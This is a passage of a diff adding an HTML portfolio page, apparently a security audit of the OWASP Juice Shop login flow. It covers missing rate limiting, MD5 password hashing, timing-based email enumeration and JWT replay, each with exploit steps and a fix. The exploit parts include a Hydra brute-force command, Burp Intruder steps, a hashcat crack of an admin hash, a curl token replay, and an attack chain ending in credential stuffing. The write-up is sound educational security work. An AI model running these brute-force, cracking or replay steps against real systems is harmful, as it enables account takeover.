+      "/rest/user/login:email=^USER^&password=^PASS^:Invalid email or password"</code>
+
+<code class="comment"># Alternatively with Burp Suite Intruder:</code>
+<code class="comment"># 1. Capture login POST → Send to Intruder</code>
+<code class="comment"># 2. Mark §password§ as the payload position</code>
+<code class="comment"># 3. Load password list → Start Attack</code>
+<code class="comment"># 4. Filter by response length — no 429 responses will appear</code></pre>
+
+            <div class="screenshot">
+                <div class="screenshot-label">📸 Screenshot — Burp Suite Intruder running against the login endpoint with no rate limiting response</div>
+                <img src="images/ratelimit-burp-intruder.png" alt="ratelimit-burp-intruder.png" style="width:100%;display:block;">
+            </div>
+
+            <div class="screenshot">
+                <div class="screenshot-label">📸 Screenshot — Hydra output showing successful credential found via brute force</div>
+                <img src="images/ratelimit-hydra-success.png" alt="ratelimit-hydra-success.png" style="width:100%;display:block;">
+            </div>
+
+            <h3 style="margin-top:28px;">How to Fix</h3>
+            <p>Apply <code style="font-family:var(--font-mono);color:var(--yellow);">express-rate-limit</code> middleware specifically on the login route. Combine with a failed-attempt counter per email for account-level lockout.</p>
+
+            <div class="diff-grid">
+                <div class="diff-panel">
+                    <div class="diff-panel-header before">❌ Vulnerable</div>
+                    <pre>
+<code class="fail">// No protection whatsoever
+app.post('/rest/user/login', login())</code></pre>
+                </div>
+                <div class="diff-panel">
+                    <div class="diff-panel-header after">✅ Fixed</div>
+                    <pre>
+<code class="fix">import rateLimit from 'express-rate-limit'
+
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 min
+  max: 10,
+  message: 'Too many login attempts',
+  standardHeaders: true,
+})
+
+app.post(
+  '/rest/user/login',
+  loginLimiter,
+  login()
+)</code></pre>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <!-- VULN 04 — WEAK HASHING -->
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <div class="vuln-entry">
+        <div class="vuln-header high">
+            <span class="vuln-index">04</span>
+            <div class="vuln-header-text">
+                <p class="vuln-title">Weak Password Hashing (MD5)</p>
+                <p class="vuln-subtitle">security.hash() uses MD5 — crackable in milliseconds</p>
+            </div>
+            <span class="severity-badge high">High</span>
+        </div>
+        <div class="vuln-body">
+
+            <p>The <code style="font-family:var(--font-mono);color:var(--yellow);">security.hash()</code> function used to hash passwords before comparison uses MD5. MD5 is a cryptographic hash function not suitable for passwords: it has no salt, no work factor, and can be computed billions of times per second on consumer hardware. Combined with the SQLi above, an attacker can dump all password hashes and crack them trivially with a rainbow table or hashcat.</p>
+
+            <h3 style="margin-top:24px;">Vulnerable Code</h3>
+            <pre data-label="lib/insecurity.ts — security.hash()">
+<code class="neutral">// The hash function in insecurity.ts — referenced in the login query</code>
+<code class="hilite">export const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')
+// ❌ MD5 — no salt, no work factor, GPU-crackable in milliseconds</code>
+
+<code class="comment">// Used in login.ts:</code>
+<code class="hilite">... AND password = '${security.hash(req.body.password || '')}' ...</code></pre>
+
+            <h3 style="margin-top:28px;">How to Exploit</h3>
+            <p>After extracting hashes via the SQL injection, use <strong style="color:var(--text-primary);">hashcat</strong> in MD5 mode against a wordlist. Common passwords are cracked in under a second.</p>
+
+            <ol class="step-list">
+                <li>Exploit the SQL injection to dump the Users table (or use SQLiteOnline with the database file).</li>
+                <li>Extract the <code style="font-family:var(--font-mono);color:var(--yellow);">password</code> column — it contains MD5 hashes.</li>
+                <li>Run hashcat in mode 0 (raw MD5) with rockyou.txt.</li>
+                <li>Admin password <code style="font-family:var(--font-mono);color:var(--yellow);">admin123</code> cracks instantly.</li>
+            </ol>
+
+            <pre data-label="hashcat — crack MD5 hashes">
+<code class="comment"># Dump a hash from the DB — e.g. admin@juice-sh.op</code>
+<code class="input">0192023a7bbd73250516f069df18b500</code>
+
+<code class="command">hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</code>
+
+<code class="comment"># Output:</code>
+<code class="pass">0192023a7bbd73250516f069df18b500:admin123</code>
+<code class="comment"># Cracked in &lt; 1 second on a standard GPU</code></pre>
+
+            <div class="screenshot">
+                <div class="screenshot-label">📸 Screenshot — hashcat output showing MD5 hash cracked to plaintext "admin123"</div>
+                <img src="images/md5-hashcat-cracked.png" alt="md5-hashcat-cracked.png" style="width:100%;display:block;">
+            </div>
+
+            <h3 style="margin-top:28px;">How to Fix</h3>
+            <p>Replace MD5 with <code style="font-family:var(--font-mono);color:var(--yellow);">bcrypt</code> or <code style="font-family:var(--font-mono);color:var(--yellow);">argon2</code>. These are adaptive hashing functions with a configurable work factor and automatic salting — designed specifically for passwords.</p>
+
+            <div class="diff-grid">
+                <div class="diff-panel">
+                    <div class="diff-panel-header before">❌ Vulnerable</div>
+                    <pre>
+<code class="fail">// lib/insecurity.ts
+export const hash = (data: string) =>
+  crypto
+    .createHash('md5')
+    .update(data)
+    .digest('hex')
+// No salt. No work factor.
+// Crackable in milliseconds.</code></pre>
+                </div>
+                <div class="diff-panel">
+                    <div class="diff-panel-header after">✅ Fixed</div>
+                    <pre>
+<code class="fix">import bcrypt from 'bcrypt'
+
+// On registration:
+export const hashPassword = async (pw: string) =>
+  bcrypt.hash(pw, 12)
+// Work factor 12 = ~300ms per hash
+// Salt is generated and stored automatically
+
+// On login:
+export const verifyPassword = async (
+  plain: string,
+  stored: string
+) => bcrypt.compare(plain, stored)</code></pre>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <!-- VULN 05 — USERNAME ENUMERATION -->
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <div class="vuln-entry">
+        <div class="vuln-header medium">
+            <span class="vuln-index">05</span>
+            <div class="vuln-header-text">
+                <p class="vuln-title">Username / Email Enumeration</p>
+                <p class="vuln-subtitle">Response timing and error messages reveal valid accounts</p>
+            </div>
+            <span class="severity-badge medium">Medium</span>
+        </div>
+        <div class="vuln-body">
+
+            <p>The login handler has two enumeration vectors: the error message is identical for both cases (<code style="font-family:var(--font-mono);color:var(--yellow);">Invalid email or password</code>), which is good — but the <strong style="color:var(--text-primary);">response time differs</strong> depending on whether the email exists. When an email is not found the query returns immediately; when it is found the password hash comparison runs, adding measurable latency. An attacker can use timing to build a list of valid email addresses.</p>
+
+            <h3 style="margin-top:24px;">Vulnerable Code</h3>
+            <pre data-label="routes/login.ts — response path">
+<code class="neutral">.then((authenticatedUser) => {
+  const user = utils.queryResultToJson(authenticatedUser)
+  if (user.data?.id && user.data.totpSecret !== '') {
+    </code><code class="comment">// ← Path A: email found, TOTP required — longer path</code>
+<code class="neutral">    res.status(401).json({ status: 'totp_token_required', ... })
+  } else if (user.data?.id) {
+    </code><code class="comment">// ← Path B: email found, no TOTP — afterLogin() runs</code>
+<code class="neutral">    afterLogin(user, res, next)
+  } else {
+    </code><code class="comment">// ← Path C: email NOT found — immediate short-circuit</code>
+<code class="hilite">    res.status(401).send(res.__('Invalid email or password.'))
+    // ❌ Timing difference between Path C and Paths A/B leaks email validity</code>
+<code class="neutral">  }
+})</code></pre>
+
+            <h3 style="margin-top:28px;">How to Exploit</h3>
+            <p>Use <strong style="color:var(--text-primary);">Burp Suite Intruder</strong> with a list of candidate email addresses. Measure response times — requests with valid emails will consistently take longer than invalid ones.</p>
+
+            <ol class="step-list">
+                <li>Capture a login POST request and send to Burp Intruder.</li>
+                <li>Set the email parameter as the payload position with a list of candidate addresses.</li>
+                <li>Run the attack and sort results by <strong style="color:var(--text-primary);">Response Received</strong> time in the results tab.</li>
+                <li>Valid emails will cluster around a higher response time than invalid ones.</li>
+            </ol>
+
+            <pre data-label="Burp Suite — timing observation">
+<code class="comment"># Invalid email — query finds nothing, returns fast</code>
+<code class="fail">POST /rest/user/login  →  401  |  Response time: ~12ms  (email not found)</code>
+
+<code class="comment"># Valid email — hash comparison runs, slightly slower</code>
+<code class="pass">POST /rest/user/login  →  401  |  Response time: ~38ms  (email found, wrong password)</code></pre>
+
+            <div class="screenshot">
+                <div class="screenshot-label">📸 Screenshot — Burp Suite Intruder results sorted by response time, revealing valid email addresses</div>
+                <img src="images/enum-burp-timing.png" alt="enum-burp-timing.png" style="width:100%;display:block;">
+            </div>
+
+            <h3 style="margin-top:28px;">How to Fix</h3>
+            <p>Always run the password comparison regardless of whether the email was found, using a pre-computed dummy hash. This makes the response time constant for both valid and invalid email addresses.</p>
+
+            <div class="diff-grid">
+                <div class="diff-panel">
+                    <div class="diff-panel-header before">❌ Vulnerable</div>
+                    <pre>
+<code class="fail">// Short-circuits immediately if email not found
+// — measurable timing difference
+.then((authenticatedUser) => {
+  const user = queryResultToJson(authenticatedUser)
+  if (user.data?.id) {
+    afterLogin(user, res, next)
+  } else {
+    res.status(401).send('Invalid email or password.')
+    // ❌ Skips hash work — returns faster
+  }
+})</code></pre>
+                </div>
+                <div class="diff-panel">
+                    <div class="diff-panel-header after">✅ Fixed</div>
+                    <pre>
+<code class="fix">// Always run bcrypt.compare — constant time
+const DUMMY_HASH = await bcrypt.hash('dummy', 12)
+
+.then(async (authenticatedUser) => {
+  const user = queryResultToJson(authenticatedUser)
+  const storedHash = user.data?.password ?? DUMMY_HASH
+  const valid = await bcrypt.compare(
+    req.body.password || '', storedHash
+  )
+  if (valid && user.data?.id) {
+    afterLogin(user, res, next)
+  } else {
+    // Same code path — same timing
+    res.status(401).send('Invalid email or password.')
+  }
+})</code></pre>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <!-- VULN 06 — JWT INVALIDATION -->
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <div class="vuln-entry">
+        <div class="vuln-header medium">
+            <span class="vuln-index">06</span>
+            <div class="vuln-header-text">
+                <p class="vuln-title">JWT Tokens Never Invalidated</p>
+                <p class="vuln-subtitle">Tokens remain valid after logout — no server-side revocation</p>
+            </div>
+            <span class="severity-badge medium">Medium</span>
+        </div>
+        <div class="vuln-body">
+
+            <p>After a successful login, the application issues a JWT and stores it in an in-memory map (<code style="font-family:var(--font-mono);color:var(--yellow);">security.authenticatedUsers</code>). There is no expiry enforcement on this map, and the logout endpoint removes the token from client storage but does not add it to a server-side denylist. An attacker who captures a token (via XSS, network sniffing, or log exposure) can reuse it indefinitely — even after the user has logged out.</p>
+
+            <h3 style="margin-top:24px;">Vulnerable Code</h3>
+            <pre data-label="routes/login.ts — afterLogin()">
+<code class="neutral">function afterLogin (user, res, next) {
+  BasketModel.findOrCreate({ where: { UserId: user.data.id } })
+    .then(([basket]) => {
+      const token = security.authorize(user)
+      user.bid = basket.id
+</code><code class="hilite">      security.authenticatedUsers.put(token, user)
+      // ❌ Token stored in-memory with no TTL
+      // ❌ No mechanism to invalidate after logout
+      // ❌ Captured token remains valid until server restarts</code>
+<code class="neutral">      res.json({ authentication: { token, bid: basket.id, umail: user.data.email } })
+    })
+}</code></pre>
+
+            <h3 style="margin-top:28px;">How to Exploit</h3>
+            <p>Capture a valid JWT token (e.g. from browser DevTools or an intercepted request), log the user out through the UI, then replay the token against authenticated endpoints.</p>
+
+            <ol class="step-list">
+                <li>Log in and copy the JWT from the response or from <code style="font-family:var(--font-mono);color:var(--yellow);">localStorage</code> in browser DevTools.</li>
+                <li>Log out of the application through the normal UI.</li>
+                <li>Send an authenticated API request using the old token — it will still succeed.</li>
+            </ol>
+
+            <pre data-label="Replay attack — curl">
+<code class="comment"># 1. Capture token at login</code>
+<code class="input">TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."</code>
+
+<code class="comment"># 2. Log out (client-side only, token not server-invalidated)</code>
+
+<code class="comment"># 3. Reuse the token — still accepted</code>
+<code class="command">curl -H "Authorization: Bearer $TOKEN" \
+     http://localhost:3000/api/Users/1</code>
+
+<code class="pass">{"status":"success","data":{"id":1,"email":"admin@juice-sh.op",...}}</code>
+<code class="comment"># ❌ Server accepted the "logged-out" token</code></pre>
+
+            <div class="screenshot">
+                <div class="screenshot-label">📸 Screenshot — Replaying a logged-out JWT token and receiving a successful authenticated response</div>
+                <img src="images/jwt-replay-success.png" alt="jwt-replay-success.png" style="width:100%;display:block;">
+            </div>
+
+            <h3 style="margin-top:28px;">How to Fix</h3>
+            <p>Implement a token denylist (backed by Redis for production) and set a short <code style="font-family:var(--font-mono);color:var(--yellow);">exp</code> claim. On logout, add the token's JTI (JWT ID) to the denylist and reject it on all subsequent requests.</p>
+
+            <div class="diff-grid">
+                <div class="diff-panel">
+                    <div class="diff-panel-header before">❌ Vulnerable</div>
+                    <pre>
+<code class="fail">// Token issued with no expiry enforcement
+const token = security.authorize(user)
+security.authenticatedUsers.put(token, user)
+
+// Logout just deletes the client cookie —
+// no server-side invalidation</code></pre>
+                </div>
+                <div class="diff-panel">
+                    <div class="diff-panel-header after">✅ Fixed</div>
+                    <pre>
+<code class="fix">// Issue short-lived JWT with jti claim
+const jti = crypto.randomUUID()
+const token = jwt.sign(
+  { userId: user.data.id, jti },
+  JWT_SECRET,
+  { expiresIn: '15m' }
+)
+
+// On logout — add jti to Redis denylist
+await redis.set(jti, '1', 'EX', 900)
+
+// On every authenticated request — check denylist
+const { jti } = jwt.verify(token, JWT_SECRET)
+if (await redis.get(jti)) {
+  return res.status(401).json({ error: 'Token revoked' })
+}</code></pre>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ── ATTACK CHAIN ── -->
+    <h2 class="section-title" style="margin-top:60px;">Real-World Attack Chain</h2>
+    <p>These vulnerabilities do not exist in isolation. A real attacker would chain them together in sequence:</p>
+
+    <ol class="step-list">
+        <li><strong style="color:var(--text-primary);">SQL Injection</strong> — Bypass authentication entirely, log in as admin without any password.</li>
+        <li><strong style="color:var(--text-primary);">SQL Injection (data exfiltration)</strong> — Dump the entire Users table, including all MD5 password hashes and email addresses.</li>
+        <li><strong style="color:var(--text-primary);">Weak Hashing</strong> — Crack the dumped MD5 hashes offline with hashcat in seconds. Recover all user passwords.</li>
+        <li><strong style="color:var(--text-primary);">Credential Stuffing</strong> — Use the recovered plaintext passwords against other services (Gmail, LinkedIn) — most users reuse passwords.</li>
+        <li><strong style="color:var(--text-primary);">Hardcoded Credentials</strong> — Log in as privileged accounts (support, testing) directly from source code without any cracking needed.</li>
+        <li><strong style="color:var(--text-primary);">JWT Replay</strong> — After establishing a session, keep the token indefinitely — no logout can revoke it.</li>
+    </ol>
+
+    <div class="callout danger">
+        <span class="callout-icon">🔥</span>
+        <p>Vulnerability 01 (SQL Injection) alone compromises the entire application. The remaining five vulnerabilities remove every safety net that might otherwise limit the blast radius of a successful attack.</p>
+    </div>
+
+    <!-- ── REMEDIATION CHECKLIST ── -->
+    <h2 class="section-title" style="margin-top:60px;">Remediation Checklist</h2>
+
+    <ul class="check-list">
+        <li><span class="icon fail">[ ]</span> Replace raw <code style="font-family:var(--font-mono);color:var(--yellow);">sequelize.query()</code> with parameterised <code style="font-family:var(--font-mono);color:var(--yellow);">UserModel.findOne()</code></li>
+        <li><span class="icon fail">[ ]</span> Remove all plaintext passwords from <code style="font-family:var(--font-mono);color:var(--yellow);">verifyPreLoginChallenges()</code> — move to env vars</li>
+        <li><span class="icon fail">[ ]</span> Add <code style="font-family:var(--font-mono);color:var(--yellow);">express-rate-limit</code> middleware with a 10 req / 15 min window on the login route</li>
+        <li><span class="icon fail">[ ]</span> Replace <code style="font-family:var(--font-mono);color:var(--yellow);">security.hash()</code> (MD5) with <code style="font-family:var(--font-mono);color:var(--yellow);">bcrypt</code> or <code style="font-family:var(--font-mono);color:var(--yellow);">argon2</code> with work factor ≥ 12</li>
+        <li><span class="icon fail">[ ]</span> Implement constant-time password verification with a dummy hash for unknown emails</li>
+        <li><span class="icon fail">[ ]</span> Implement JWT denylist (Redis-backed) and short <code style="font-family:var(--font-mono);color:var(--yellow);">exp</code> claims (15 min)</li>
+        <li><span class="icon fail">[ ]</span> Re-hash all existing MD5 passwords in the database on next user login (migration strategy)</li>
+        <li><span class="icon fail">[ ]</span> Run Checkov or a SAST tool on the repository to catch secrets committed to source</li>
+    </ul>
+
+    <!-- ── WHAT I LEARNED ── -->
+    <h3 style="margin-top:50px;">🧠 What I Learned</h3>
+
+    <ul class="features-list">
+        <li>How a <strong>single SQL injection</strong> can cascade into a full account takeover chain for every user in the database</li>
+        <li>Why <strong>ORM parameterisation</strong> is not optional — raw string queries should never contain user input</li>
+        <li>The practical difference between <strong>cryptographic hashes</strong> (MD5/SHA) and <strong>password hashing functions</strong> (bcrypt/argon2)</li>
+        <li>How <strong>timing side-channels</strong> can leak information even when error messages are identical</li>
+        <li>Why <strong>JWTs need server-side revocation</strong> — stateless tokens are convenient but dangerous without a denylist</li>
+        <li>How to use <strong>Burp Suite, Hydra, and hashcat</strong> to prove real-world exploitability, not just theoretical risk</li>
+    </ul>
+
+    <br>
+    <div style="font-family:var(--font-mono);font-size:0.82rem;color:var(--text-muted);padding:20px 0;border-top:1px solid var(--text-muted);margin-top:20px;">
+        📁 &nbsp;<a href="https://github.com/MarcoAbreu2002" style="color:var(--accent-color);text-decoration:none;">github.com/MarcoAbreu2002</a>
+        &nbsp;·&nbsp;
+        <span>OWASP Juice Shop — Login Security Audit &copy; 2026</span>
+    </div>
+
+</div>
+</section>
+
+<footer>
+    <p>Marco Abreu &copy; 2026</p>
+</footer>
+
+</body>
+</html>
